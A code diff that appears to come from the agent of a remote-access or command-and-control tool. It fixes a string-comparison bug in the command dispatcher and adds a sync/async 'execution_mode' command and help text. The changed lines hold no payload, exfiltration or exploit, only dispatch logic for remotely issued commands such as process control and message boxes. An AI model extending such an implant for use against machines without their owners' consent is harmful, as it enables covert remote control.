@@ -131,10 +131,13 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     } else if (strcmp(command, "resume_process") == 0) {
         DEBUG_LOG("[COMMAND] resume_process\n");
         resume_process(response_struct, args);
-    } else if (strcmp(command, "list_process")) {
+    } else if (strcmp(command, "list_process") == 0) {
         DEBUG_LOG("[COMMAND] list_process\n");
         list_processes(response_struct);
-    }   else {
+    } else if (strcmp(command, "execution_mode") == 0) {
+        DEBUG_LOG("[COMMAND] execution_mode\n");
+        set_execution_mode_command(response_struct, args);
+    } else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
         set_response_data(response_struct, "Unknown command");
     }
@@ -191,6 +194,26 @@ void set_response_data(OutboundJsonDataStruct* response_struct, const char* data
 // ====================
 // Commands
 // ====================
+
+void set_execution_mode_command(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* mode_arg = strtok_s(args, " ", &context);
+
+    if (mode_arg == NULL) {
+        set_response_data(response_struct, "Missing execution mode argument (async or sync)");
+        return;
+    }
+
+    if (strcmp(mode_arg, "async") == 0) {
+        set_execution_mode(EXEC_MODE_ASYNC);
+        set_response_data(response_struct, "Execution mode set to asynchronous");
+    } else if (strcmp(mode_arg, "sync") == 0) {
+        set_execution_mode(EXEC_MODE_SYNC);
+        set_response_data(response_struct, "Execution mode set to synchronous");
+    } else {
+        set_response_data(response_struct, "Invalid execution mode. Use 'async' or 'sync'.");
+    }
+}
 
 void get_username(OutboundJsonDataStruct* response_struct) {
     /*
@@ -449,7 +472,10 @@ void help(OutboundJsonDataStruct* response_struct) {
 **User Interaction:**\n\
     `messagebox`: (messagebox <str: title> <str: message>) - Displays a message box on screen.\n\n\
 **Config Commands:**\n\
-    `sleep`: (sleep <int: sleeptime (seconds)>) - Sets the sleep time.\n\n\
+    `sleep`: (sleep <int: sleeptime (seconds)>) - Sets the sleep time.\n\
+    `execution_mode`: (execution_mode: <str: sync, async>): Whether ASYNC or SYNC execution.\n\
+        ASYNC: Runs a command every loop, no matter the state of the previous command\n\
+        SYNC: Runs commands one after another. if Command 1 takes 5 minutes, the command 2 won't be run until completion of the first.\n\
 ";
 
     set_response_data(response_struct, help_string);
